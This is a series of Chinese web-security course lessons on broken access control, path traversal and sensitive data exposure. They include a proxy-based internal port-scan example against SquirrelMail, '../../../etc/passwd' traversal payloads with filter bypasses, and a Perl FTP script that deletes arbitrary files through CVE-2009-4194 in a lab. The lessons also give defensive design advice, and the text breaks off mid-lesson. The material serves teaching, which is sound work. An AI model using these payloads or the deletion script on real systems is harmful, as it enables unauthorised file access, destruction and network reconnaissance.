<h3 id="意外的代理访问">意外的代理访问</h3>

<p>如果一个应用从输入流组件接受到了外部的请求、消息或者命令，并且这些请求、消息或者命令没有经过有效的请求源处理就被转发到应用控制范围外的某个资产中，这时就会诱发一种访问控制失效风险。</p>

<p>想象一下，当你还在读书的时候，在学校里同学给了你一份蛋糕，希望你回家后可以转送给你的妹妹，而你到家之后由于疏忽直接把蛋糕给了妹妹并且没有任何说明，这时妹妹会以为这份蛋糕是你买给她的礼物，这就造成了一种误解。</p>

<p>回到我们所描述的技术场景，这个应用就是“你”的身份，而请求被转发的目标资产就是“你的妹妹”，这个应用此时成为了一种代理或者中间人的角色，使得不应该被访问到的资产被意外访问到了。</p>

<p>再稍微拓展开讲一讲，如果一个攻击者不能直接访问目标，但是一个应用可以，这时攻击者可以发送请求到应用，再让应用转发请求到最终目标。这种情况下，攻击请求看起来像是来自应用的访问，而非真实攻击者。这种攻击的效果很直观，可以直接绕过访问控制（如防火墙）或者隐蔽恶意请求源信息。</p>

<p><strong>我们不仅需要知道这种风险的威力，还需要了解这种风险在什么情况下会出现。</strong>由于类似的消息转发或者代理功能大部分情况下都是正常功能，因此我们不能因噎废食，仅仅是因为有可能存在安全风险就抛弃正常功能。这就需要我们去了解，在什么情况下这种功能会变成一种漏洞：</p>

<ol>
<li>应用本身的权限和用户可以操纵的输入流组件所属的权限不同；（条件A）</li>
<li>攻击者并不能够直接发送请求到最终目标资产；（条件B）</li>
<li>攻击者能够创建一个可以被转发的请求，这个请求可能：

<ul>
<li>指向了未授权访问的域名、端口号、IP以及服务；（条件C）</li>
<li>指向了被授权访问的服务，但是请求内部包含了未授权的指令、资源等。（条件D）</li>
</ul></li>
</ol>

<p>用简单的公式来描述的话，就是只有在<strong>“A &amp;&amp; B &amp;&amp; ( C || D )”</strong>的情况下，消息转发或者代理功能才会成为一种安全风险或者安全漏洞。</p>

<h3 id="cve-2010-1637漏洞"><strong>CVE-2010-1637漏洞</strong></h3>

<p>接下来我们看一个非常有趣的漏洞，它的编号是CVE-2010-1637。这个漏洞会影响SquirrelMail 1.4.20以及更早的版本，漏洞主要的发生点是Mail Fetch组件，由于该组件是SquirrelMail的默认组件，因此该漏洞影响力还是很大的。如果该漏洞存在，那么经过认证的远程用户就可以得到允许绕过防火墙限制，将SquirrelMail作为一个代理（proxy）进一步扫描内网。</p>

<p>mail_fetch是在SquirrelMail 1.4.20版本的一个默认组件:</p>

<pre><code class="language-bash hljs">hunter@HunterdeiMac &gt; ~/Downloads/squirrelmail-1.4.20/plugins &gt; tree mail_fetch
mail_fetch
├── README
├── class.POP3.php
├── fetch.php
├── functions.php
├── index.php
├── options.php
└── setup.php
 
0 directories, 7 files
</code></pre>

<p>mail_fetch的主要功能是通过使用fsockopen()这个PHP函数来模拟POP3协议，并且仅支持了POST方式的认证，并没有对IP以及端口号进行检查：</p>

<pre><code class="language-php hljs">...
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$port</span>) || !<span class="hljs-variable">$port</span>) {<span class="hljs-variable">$port</span> = <span class="hljs-number">110</span>;}
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;MAILSERVER))
    <span class="hljs-variable">$server</span> = <span class="hljs-variable language_">$this</span>-&gt;MAILSERVER;
 
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$server</span>)){
      <span class="hljs-variable language_">$this</span>-&gt;ERROR = <span class="hljs-string">"POP3 connect: "</span> . <span class="hljs-title function_ invoke__">_</span>(<span class="hljs-string">"No server specified"</span>);
      <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;FP);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// 老师加的注释</span>
    <span class="hljs-comment">// 此处缺乏对于服务器IP及端口号的检查</span>
    <span class="hljs-variable">$fp</span> = @<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">"<span class="hljs-subst">$server</span>"</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>);
 
    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>) {
      <span class="hljs-variable language_">$this</span>-&gt;ERROR = <span class="hljs-string">"POP3 connect: "</span> . <span class="hljs-title function_ invoke__">_</span>(<span class="hljs-string">"Error "</span>) . <span class="hljs-string">"[<span class="hljs-subst">$errno</span>] [<span class="hljs-subst">$errstr</span>]"</span>;
      <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;FP);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
...
</code></pre>

<p>经过简单的分析，可以发现该代码段符合“A &amp;&amp; B &amp;&amp; ( C || D )”的漏洞存在条件，该处应该存在失效的访问控制。</p>

<p>找到了切入点，接下来你就可以通过下面三个步骤实现汽车变成汽车人的精彩过程——<strong>将SquirrelMail变成Nmap扫描器</strong>：</p>

<ol>
<li>服务端先返回消息的Service，比如SSH这种，通过对TCP服务的Banner信息抓取，可以了解目标资产提供的Service；</li>
<li>客户端先发送消息的Service，比如HTTP这种，POP3对象在建立完TCP三次握手之后会进入阻塞状态，通过fgets()函数设置硬编码超时时间，可以判断目标端口是否开放；</li>
<li>由于仅仅支持POST方式认证，因此请求是以账户为前置条件去发送的，所以Cookie也是需要的。</li>
</ol>

<p><strong>那么到现在为止，我们已经有了“汽车人”变形之后的完整功能设计图：</strong></p>

<pre><code class="language-bash hljs">./squirrel-nmap [Target] [IP] [TCP_PORT] [Cookie]
- Target suqiremail的URL地址，如http://target.com/sqm/
- IP 待扫描的IP地址
- TCP_PORT 尝试探测的TCP端口号
- Cookie 经过认证的Cookie
</code></pre>

<p>通过简单的实现，我们来看看实际的战斗威力如何：</p>

<pre><code class="language-bash hljs">./squirre-nmap <span class="hljs-string">"http://target.com/squirrelmail-1.4/"</span> 192.168.1.4 22 <span class="hljs-string">"key=dTPc00s%3D;SQMSESSID=2600633c256570917fe25d7773eb41b3"</span>
Fetching from 192.168.1.4:22
Oops, POP3 connect: Error [SSH-2.0-OpenSSH_5.1p1 Debian-3]
</code></pre>

<p>可以看到能够成功地对内网IP进行Service进行探测。</p>

<h2 id="安全建设方案">安全建设方案</h2>

<p>通过这次探讨，你可以发现访问控制是授权或拒绝特定用户请求的过程。这个过程只有在应用开发的初始阶段就经过良好的设计，才能避免后续问题的发生。接下来我会提出一些优秀的访问控制设计原则，供你在实践中参考：</p>

<p><strong>1. 优先开始设计访问控制体系</strong>-
访问控制不仅是应用安全设计的一项主要事务，而且应当被设置在非常优先的位置，因为往往访问控制的设计在起步阶段是相对简单的，但是会很快随着功能点的增多快速复杂化。所以，如果你考虑使用成熟的软件框架来完成访问控制，一定要确保其能够满足你未来的应用定制化需求。</p>

<p><strong>2. 强制所有请求经过访问控制检查</strong>-
开发一个访问控制检查层（Layer），然后确保所有请求都在某种程度上经过这个检查层。以Java的filter为例，许多自动化的请求处理机制都是能够帮助我们实现这种需求的技术形态。</p>

<p><strong>3. 默认拒绝</strong>-
这是非常简单但是有效的策略，所谓默认拒绝是指，只要一个请求没有被指明是被允许的，那么它就是被拒绝的。</p>

<p><strong>4. 不要硬编码角色</strong>-
很多应用框架默认使用用户角色来进行访问控制，以下的代码形态是很常见的：</p>

<pre><code class="language-bash hljs"><span class="hljs-keyword">if</span> (user.hasRole(<span class="hljs-string">"admin"</span>) || user.hasRole(<span class="hljs-string">"Manager"</span>)) {
  deleteAccount();
}
</code></pre>

<p>但是你要对这种Role-Based编码模式格外留意，因为它可能会带来以下几种风险：</p>

<ul>
<li>由于这种编码自身的特性非常脆弱，很容易出现检查错误或者检查缺失等情况；</li>
<li>由于这种编码模型对于多租户产品非常不友好，很容易出现用户角色一致但是权限不一致的情况；</li>
<li>Role-Based编码模型无法适配包括以数据为核心的以及横向访问控制；</li>
<li>当项目代码量攀升并且伴随着很多访问权限控制的情况出现时，访问控制策略的审计和验证是非常困难的。</li>
</ul>

<p>因此这里我更推荐你使用这种编码方式：</p>

<pre><code class="language-bash hljs"><span class="hljs-keyword">if</span> (user.hasAccess(<span class="hljs-string">"DELETE_ACCOUNT"</span>)) {
  deleteAccount();
}
</code></pre>

<p>以属性或者功能为核心的访问控制编码模型，从特性上来讲更易于构建功能丰富的访问控制系统。</p>

<p><strong>5. 记录所有的访问控制类事件</strong>-
所有的访问控制失效都应该有完整的记录，因为这些事件很可能成为恶意用户尝试寻找系统漏洞的线索。</p>

<h2 id="总结">总结</h2>

<p>这节课程我们学习了2021年OWASP TOP 10中排行第一的风险类别——失效的访问控制，访问控制是安全建设的第一关，也是最重要的一环 —— 它不仅和安全建设相关，更是产品功能的一个组成部分。</p>

<p>首先我们对访问控制的概念和范围进行了整体探讨，列举了一些典型的访问控制失效场景：</p>

<ol>
<li>系统实现过程中违背最小权限原则；</li>
<li>修改API参数实现越权；</li>
<li>提供唯一ID给用户预览数据；</li>
<li>未对PUT、DELETE防范进行限制；</li>
<li>元数据（JWT、Cookie）操纵；</li>
<li>CORS误配置。</li>
</ol>

<p>然后针对这些典型的访问控制失效场景，我们展示了对应的问题代码。</p>

<p>在漏洞挖掘过程中，作为安全或者开发人员，我们要先对待挖掘的漏洞有清晰的认知，对于一些稍复杂的逻辑漏洞最好能够进行清晰的数学描述。</p>

<p>这里我们以“意外的代理访问”类型漏洞为例，抽象出了一个数学模型——“A &amp;&amp; B &amp;&amp; ( C || D )”用于该类漏洞的判断，并利用模型成功分析了一个2010年真实发生的的0 Day漏洞。</p>

<p>在最后一部分，我们对访问控制层面的安全建设做了分析，并且给出了一些优秀的设计层、编码层的建议：</p>

<ol>
<li>在系统构建阶段优先设计访问控制体系；</li>
<li>强制所有请求经过访问控制检查；</li>
<li>采用默认拒绝原则；</li>
<li>采取以权限为核心的编码原则；</li>
<li>记录所有访问控制类事件。</li>
</ol>

<p>以我们所探讨的安全建设方案为基础，相信你可以进行优雅的编码并设计出优秀的访问控制系统，构建起你的应用安全的第一道防线。</p>

<h2 id="思考题">思考题</h2>

<p>除了这节课程我们提到的风险种类，访问控制失效你还能想到哪些风险类型呢？</p>

<p>期待你的思考，也欢迎你在留言中与我交流，或者转发给你的朋友加入讨论。我们下节课再见！</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="02 路径穿越：你的Web应用系统成了攻击者的资源管理器？" class="title">02 路径穿越：你的Web应用系统成了攻击者的资源管理器？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>上节课呢，我们学习了失效的访问控制，这节课我想和你一起探索另一个有趣的漏洞类型——神奇的路径穿越。</p>

<p>想象你是一个勇者，而你这次的目标是要进入一座盘踞着古龙的城堡寻找宝藏。考虑到自己还不够强大，正面进攻明显会送了自己的小命，于是你打算先绕道看看，这个城堡有没有什么其他可以进入的方式。幸运的是，作为一座昔日的王宫，这座城堡的设计完整，有许多侧门；但同时你也会发现，每一扇侧门的背后不是仓库就是守卫室，完全不能帮助你进入城堡内部。经过了一整天的探索，你终于发现了一个房间，它和其他仓库在外观上并无二致，唯一的不同是其中一块地板下竟藏着一扇暗门，你怀着好奇缓缓开启这扇门，发现面前正是一条通往城堡的密道…</p>

<p>如果把城堡看作是你进行安全检测的系统，那么恭喜你，现在你已经成功找到了路径穿越漏洞。通过这种漏洞，你可以访问“城堡”内部的各种“宝藏”。当然，你具体能访问到什么样的宝藏，还要取决于地道究竟能够通往何处。</p>

<h2 id="路径穿越">路径穿越</h2>

<p>那么什么是路径穿越呢？简单来说，你所构建的系统中有一个功能组件使用外部输入来构建文件名，而这个文件名会用来定位一个在受限目录的文件，如果文件名中既包含一些特殊元素，又没有进行合理的过滤处理，就会导致路径被解析到受限文件夹之外的目录。</p>

<p>扩展开讲一讲，很多系统内部的文件操作都希望被限制在特定目录中进行。通过使用<code>..</code>以及<code>/</code>符号，攻击者可以进行文件路径逃逸。其中最常见的符号组合是<code>../</code>，这种符号组合在操作系统中会被解析为上级目录，这种漏洞被称为相对路径穿越。绝对路径穿越是另一种类型的路径穿越，比如<code>/usr/local/bin</code>就是典型的例子。</p>

<p>接下来我们看几种典型的攻击场景：</p>

<ol>
<li>这里我们来看一种典型的<strong>社交网络应用代码</strong>，每个用户的配置文件都被存储在单独的文件中，所有文件被集中到一个目录里：</li>
</ol>

<pre><code class="language-perl hljs"><span class="hljs-keyword">my</span> $dataPath = <span class="hljs-string">"/users/example/profiles"</span>;
<span class="hljs-keyword">my</span> $username = param(<span class="hljs-string">"user"</span>);
<span class="hljs-keyword">my</span> $profilePath = $dataPath . <span class="hljs-string">"/"</span> . $username;

<span class="hljs-regexp">//</span> 这里是老师写的注释
// 并没有对用户传入的username参数进行验证
<span class="hljs-keyword">open</span>(<span class="hljs-keyword">my</span> $fh, <span class="hljs-string">"&lt;$profilePath"</span>) || ExitError(<span class="hljs-string">"profile read error: $profilePath"</span>);
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;ul&gt;\n"</span>;
<span class="hljs-keyword">while</span>(&lt;$fh&gt;) {
    <span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;li&gt;$_&lt;/li&gt;\n"</span>;
}
<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;/ul&gt;\n"</span>;
</code></pre>

<p>当用户尝试去访问自己的配置文件的时候，会组成如下路径：</p>

<pre><code class="language-plain">/users/example/prfiles/hunter
</code></pre>

<p>但是这里要注意的是上述代码并没有对用户传入的参数做验证，因此攻击者可以提供如下参数：</p>

<pre><code class="language-plain">../../../etc/passwd
</code></pre>

<p>通过拼接，攻击者将会得到一个完整的路径：</p>

<pre><code class="language-plain">/users/example/profiles/../../../etc/passwd ==&gt; /etc/passwd
</code></pre>

<p>通过这条路径，攻击者就可以成功访问到Linux系统的password文件。</p>

<ol>
<li>下面这个代码在编写过程中考虑到输入的不安全性，<strong>采用了黑名单方式</strong>，过滤掉了输入中包含的<code>../</code>字符。</li>
</ol>

<pre><code class="language-perl hljs"><span class="hljs-keyword">my</span> $username = GetUntrustedInput();
<span class="hljs-regexp">//</span> 这里是老师写的注释
// 黑名单方式过滤
// 对username的过滤不严格
$username = ~ <span class="hljs-regexp">s/\.\.\///</span>;
<span class="hljs-keyword">my</span> $filename = <span class="hljs-string">"/home/user/"</span> . $username;
ReadAndSendFile($filename);
</code></pre>

<p>但是值得注意的是，过滤代码中并没有使用<code>/g</code>这个全局匹配符，因此仅仅过滤掉了参数中出现的第一个<code>../</code>字符：</p>

<pre><code class="language-plain">../../../etc/passwd =&gt; /home/user/../../etc/passwd
</code></pre>

<p>所以攻击者仍然可以通过多层拼接来实现攻击。</p>

<ol>
<li>如下代码也在编写中考虑到输入的不安全性，<strong>它采用了白名单方式</strong>，限制了路径：</li>
</ol>

<pre><code class="language-java hljs"><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> getInputPath();
<span class="hljs-comment">// 这里是老师写的注释</span>
<span class="hljs-comment">// 白名单方式过滤</span>
<span class="hljs-comment">// 对path的限制不够严格</span>
<span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">"/safe_dir/"</span>))
{
    <span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);
    f.delete()
}
</code></pre>

<p>但是攻击者依然可以通过提供如下参数进行绕过：</p>

<pre><code class="language-plain">/safe_dir/../etc/passwd
</code></pre>

<ol>
<li>如下代码<strong>通过在前端上传文件自动获取属性</strong>，凭借这样的方式限制用户输入：</li>
</ol>

<pre><code class="language-plain">&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;

Choose a file to upload:
&lt;input type="file" name="filename"/&gt;
&lt;br/&gt;
&lt;input type="submit" name="submit" value="Submit"/&gt;

&lt;/form&gt;
</code></pre>

<p>如下Java Servlet代码通过doPost方法接受请求，从HTTP Request Header中解析文件名，然后从Request中读取内容后再写入本地upload目录：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUploadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> {
    ...
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException {
        response.setContentType(<span class="hljs-string">"text/html"</span>);
        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();
        <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> request.getContentType();

        <span class="hljs-comment">// the starting position of the boundary header</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">ind</span> <span class="hljs-operator">=</span> contentType.indexOf(<span class="hljs-string">"boundary="</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">boundary</span> <span class="hljs-operator">=</span> contentType.substring(ind+<span class="hljs-number">9</span>);

        <span class="hljs-type">String</span> <span class="hljs-variable">pLine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">uploadLocation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(UPLOAD_DIRECTORY_STRING); <span class="hljs-comment">//Constant value</span>

        <span class="hljs-comment">// verify that content type is multipart form data</span>
        <span class="hljs-keyword">if</span> (contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.indexOf(<span class="hljs-string">"multipart/form-data"</span>) != -<span class="hljs-number">1</span>) {
            <span class="hljs-comment">// extract the filename from the Http header</span>
            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(request.getInputStream()));
            ...
            pLine = br.readLine();
            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> pLine.substring(pLine.lastIndexOf(<span class="hljs-string">"\\"</span>), pLine.lastIndexOf(<span class="hljs-string">"\""</span>));
            ...

            <span class="hljs-comment">// output the file to the local upload directory</span>
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 这里是老师写的注释</span>
                <span class="hljs-comment">// 攻击者可以修改Request中的filename进行攻击</span>
                <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(uploadLocation+filename, <span class="hljs-literal">true</span>));
                <span class="hljs-keyword">for</span> (String line; (line=br.readLine())!=<span class="hljs-literal">null</span>; ) {
                    <span class="hljs-keyword">if</span> (line.indexOf(boundary) == -<span class="hljs-number">1</span>) {
                        bw.write(line);
                        bw.newLine();
                        bw.flush();
                    }
                } <span class="hljs-comment">//end of for loop</span>
                bw.close();
            } <span class="hljs-keyword">catch</span> (IOException ex) {
                ...
            }
            <span class="hljs-comment">// output successful upload response HTML page</span>
        }
        <span class="hljs-comment">// output unsuccessful upload response HTML page</span>
        <span class="hljs-keyword">else</span>
        {...}
    }
    ...
}
</code></pre>

<p>上述代码一方面没有对上传的文件类型进行检查（这节课我们不探讨这个安全问题），另一方面没有检查filename就直接进行了拼接，因此攻击者只需要通过Burpsuite、ZAP等Proxy应用对Request进行拦截和修改filename属性即可利用路径穿越漏洞。</p>

<p>在了解典型的风险场景之后，我们来看一下实战中真正出现过的安全漏洞。</p>

<h2 id="案例实战">案例实战</h2>

<h4 id="cve-2009-4194"><strong>CVE-2009-4194</strong></h4>

<p>该漏洞是一个目录穿越漏洞，影响的软件版本是Golden FTP Server 4.30 Free 以及 Professional版本、4.50版本（未验证），允许攻击者通过DELE命令删除任意文件。</p>

<p>启动MiTuan中的CVE-2009-4194靶机，这是一个Windows 7系统，内置了Golden FTP Server 4.30版本，并且已经预先设置好了FTP共享路径：</p>

<pre><code class="language-plain">C:\Users\sty\Desktop
</code></pre>

<p>接下来构建我们的攻击程序，为了方便我们采用Perl语言。如果你使用的是Mac电脑，那么你可以无需配置环境，直接运行我们编写好的攻击程序体验效果：</p>

<pre><code class="language-perl hljs"><span class="hljs-keyword">use</span> strict;
<span class="hljs-keyword">use</span> Net::FTP

<span class="hljs-keyword">print</span> <span class="hljs-string">"1"</span>;
<span class="hljs-keyword">my</span> $ftp = Net::FTP-&gt;new(<span class="hljs-string">"52.81.192.166"</span>, <span class="hljs-string">Debug =&gt;</span> <span class="hljs-number">1</span>) || <span class="hljs-keyword">die</span> $@;

$ftp-&gt;login(<span class="hljs-string">"anonymous"</span>, <span class="hljs-string">""</span>) || <span class="hljs-keyword">die</span> $ftp-&gt;message;

$ftp-&gt;cwd(<span class="hljs-string">"/Desktop/"</span>) || <span class="hljs-keyword">die</span> $ftp-&gt;message;

<span class="hljs-comment"># This deletes the file C:\Users\sty\test.txt</span>
$ftp-&gt;<span class="hljs-keyword">delete</span>(<span class="hljs-string">"../test.txt"</span>);

$ftp-&gt;quit;

$ftp = <span class="hljs-keyword">undef</span>;
</code></pre>

<p>通过上述的代码，我们可以看到<code>C:\Users\sty\test.txt</code>文件已经被删除了，我们成功穿越了FTP Server的限制，实现了了任意文件的删除！又一个神奇的漏洞被我们成功利用了，身为勇士的你成功地获取了城堡内宝藏的控制权。</p>

<h2 id="防御方案">防御方案</h2>

<p>既然我们已经了解了漏洞的原理、发生的场景以及利用方式，那么我们要如何防御这种类型的攻击，并且预防潜在的漏洞出现呢？我们可以从不同的阶段出发，进行多维度安全建设，从而最大化地降低这类风险出现的概率。</p>

<p><strong>在编码实现阶段：</strong>-
1. 假设所有的输入都是恶意的，使用“只接受已知的善意的”输入检查策略，也就是使用一些定义清晰且严格的参数格式；-
2. 输入都应该被解码为程序内部的处理格式，并且确保在应用系统没有被二次解码，防止攻击者通过编码或者二次编码进行绕过；-
3. 如果可能，为用户提供选项或者通过应用系统内部ID映射的方式进行对象访问，例如ID 1对应“info.txt”；-
4. 确保Error Message只包含最小必要信息，避免过于详细的信息展示，防止攻击者因此获取系统相关信息。</p>

<p><strong>在架构设计阶段：</strong>-
1. 确保所有客户端发生的安全检查，都在服务端完成第二次检查，这样做的目的是防止攻击者在客户端进行安全检查绕过；-
2. 使用成熟的库或者框架来使开发者更容易规避这种特定类型的风险。</p>

<p><strong>在防御建设阶段：</strong>-
1. 使用可以防御这种类型攻击的应用层防火墙，在某些特定情况下（比如应用系统漏洞无法修复）非常有效；-
2. 使用最小权限运行开发完毕的应用系统，如果可能，创建独立的受限账户用于应用系统运行；-
3. 使用沙箱环境运行开发完毕的应用系统，做好进程和系统之间的边界隔离。</p>

<p>回到我们最初的场景，此时你不再是想要潜入城堡的勇士，而是昔日负责城堡建设的规划师。那么编码实现阶段的输入过滤就像一道道门禁关卡，只有真正城堡内部的人才能进入；架构设计阶段则让你从内到外地落地安全检查，当然你也可以借鉴成熟的城堡设计方案；最后在防御建设阶段，做好每个通道的隔离，确保不会有任何一条通道可以直接进入城堡核心区域。</p>

<h2 id="总结">总结</h2>

<p>构建一个安全优雅的系统，<strong>保持神秘性是一个至关重要的因素</strong>，让用户只看到他应该看到的东西，是这一切的前提。</p>

<p>不怀好意的攻击者往往非常聪明，你让他看见一滴水，他就能想到路的尽头是一片海洋，最有趣的事情在于你所建设的系统尽头恰好有一片海洋，而且海里还有攻击者垂涎的海鲜。</p>

<p>这节课我们分析了<strong>常见的路径穿越场景</strong>和这些场景下的<strong>典型漏洞利用代码</strong>：</p>

<ol>
<li>未对用户输入做验证；</li>
<li>黑名单检测绕过；</li>
<li>白名单检测绕过；</li>
<li>前端检测绕过。</li>
</ol>

<p>我们还以<strong>漏洞CVE-2009-4194</strong>为例，带你在实战中复现了路径穿越漏洞。</p>

<p>最后，我从编码实现、架构设计、防御建设3个不同的阶段，给你提供了<strong>安全编码和系统加固的建议</strong>：</p>

<ol>
<li>对所有用户输入执行严格的输入检查，确保不会出现二次解码绕过问题，并推荐使用内部ID映射的方式进行对象访问；</li>
<li>使用成熟的开发框架，并且在客户端、服务端都执行安全检查；</li>
<li>使用沙箱环境运行应用系统，遵循最小权限原则，使用独立的受限权限账户，并在边界架设应用防火墙。</li>
</ol>

<p>以上，就是本节课的内容——构建一个安全优雅的系统，让用户只能走到他该走到的地方。</p>

<h2 id="思考题">思考题</h2>

<p>通过本节课的案例实战，你可以尝试自己复现CVE-2009-4053漏洞吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="03 敏感数据泄露：攻击者如何获取用户账户？" class="title">03 敏感数据泄露：攻击者如何获取用户账户？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>“人只要奋斗就会犯错。”</p>

<p>这是一个非常好的句子，出自歌德的代表作，长篇诗剧《浮士德》。</p>

<p>一千个读者有一千个哈姆雷特，每个人对这句话的理解都不尽相同。悲观的人或许会理解为“人努力了就要犯错误，所以就不要再努力了”；但是从我的经历看来，我更愿意相信它是在说“人努力成长本身就是试错的过程，犯错是难免的，不要因为害怕犯错而停止努力”。</p>

<p>为什么要提到这句话呢？因为系统如人——是有生命力的，系统随着不断更新会出现新的问题，甚至有时候问题本身就是功能设计的一部分。很多敏感数据泄露风险的源头，一部分出现在技术层，一部分出现在设计层，正如我们上面所讲，做得多了，难免会犯错。</p>

<h2 id="敏感数据泄露">敏感数据泄露</h2>

<p>什么是敏感数据泄露呢？简单来说，<strong>如果我们的应用系统向一个未得到访问授权的用户暴露了敏感信息，那么这就是一种敏感数据泄露风险</strong>。</p>

<p>拓展讲一讲，设计上或者技术上有很多意外的失误会导致数据泄露。并且这种错误的严重级别分布也很宽泛，具体要取决于应用系统执行的上下文、被泄露敏感数据的类型以及攻击者从中获取的收益，这里我们列举一些数据类型。</p>

<p>比如个人信息分类，包括即时通讯消息、银行卡信息、交易信息、健康信息、地理位置信息以及订单信息等；系统状态信息分类，包括操作系统信息、环境变量信息、第三方包信息等；还有网络及配置信息、应用系统代码及内部状态信息、元数据信息等等。</p>

<p><strong>不仅数据本身涉及分类分级，对于不同的群体而言，数据的敏感性也是不同的</strong>，每个用户群体对于数据保护有着不同的诉求。他们可能是应用系统开发者、应用系统引入的第三方数据的原始拥有者、应用系统管理员（包括业务层、应用层、系统层和运维层）、应用系统的直接用户等。</p>

<p>在了解数据的多样性以及使用群体的多样性之后，<strong>我们接下来看一下数据泄露方式的多样性</strong>。</p>

<p>首先，在代码层面可能会直接将敏感数据插入到某个消息或者资源中，这个携带着敏感数据的消息或资源被未授权的用户成功访问就会导致数据泄露。</p>

<p>其次，可能会由于系统内部错误直接将敏感数据插入到资源文件中，比如Web脚本错误泄露应用系统的全路径。</p>

<p>再或者，虽然在代码层面对于敏感数据有着良好的管理，但是由于编码问题，可能导致敏感数据资源被意外地展示在攻击者面前。</p>

<p>可以看到，敏感数据泄露并非单一的技术问题 ，它不仅具备多种风险形态，有时候更是设计层面考虑不全面导致的。</p>

<p>接下来我们一起来看看有哪些比较典型的风险场景：</p>

<p><strong>1. 应用系统逻辑设计问题</strong>-
如下代码检测了用户名及密码的正确性并且给出用户结果反馈：</p>

<pre><code class="language-perl hljs"><span class="hljs-keyword">my</span> $username = param(<span class="hljs-string">'username'</span>);
<span class="hljs-keyword">my</span> $password = param(<span class="hljs-string">'password'</span>);

<span class="hljs-keyword">if</span> ( IsValidUsername($username) )
{
    <span class="hljs-keyword">if</span> ( IsValidPassword($username, $password) )
    {
        <span class="hljs-keyword">print</span> <span class="hljs-string">"Login successful"</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-keyword">print</span> <span class="hljs-string">"Login failed - incorrect password"</span>;
    }
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Login failed - incorrect username"</span>;
}
</code></pre>

<p>上述代码中，对于不同的账户名、密码错误组合给出了不同的信息反馈，这样的设计使得潜在攻击者能够获得足够的信息来判断login函数的返回值，因此攻击者能够使用暴力破解的方式来遍历合法的用户名，从而可以进一步尝试暴力破解或者通过社工库撞库等方式获得对应的密码。不可否认的是，这样的设计是希望给用户提供更多友好性，但也为潜在攻击者提供了友好性，这里推荐的实现方案是如下这种：</p>

<pre><code class="language-perl hljs"><span class="hljs-keyword">print</span> <span class="hljs-string">"Login failed - incorrect username or password"</span>
</code></pre>

<p>这里将错误输出设定为同一种，这样在没有丧失用户友好性的同时强化了安全性。</p>

<p><strong>2. 异常处理问题</strong>-
如下代码尝试建立一个数据库连接，并且将exception输出：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">try</span> {
    openDBConnection();
} <span class="hljs-keyword">catch</span> (Exception $e) {
    echo <span class="hljs-string">'Caught exception:'</span>, $e-&gt;getMessage();
}
</code></pre>

<p>上述代码中，如果由于网络原因（常见）或者其他原因导致Exception的发生，会在用户访问的页面出现Exception信息，这其中就可能包含数据库连接的相关信息。</p>

<p><strong>3. 应用部署问题</strong>-
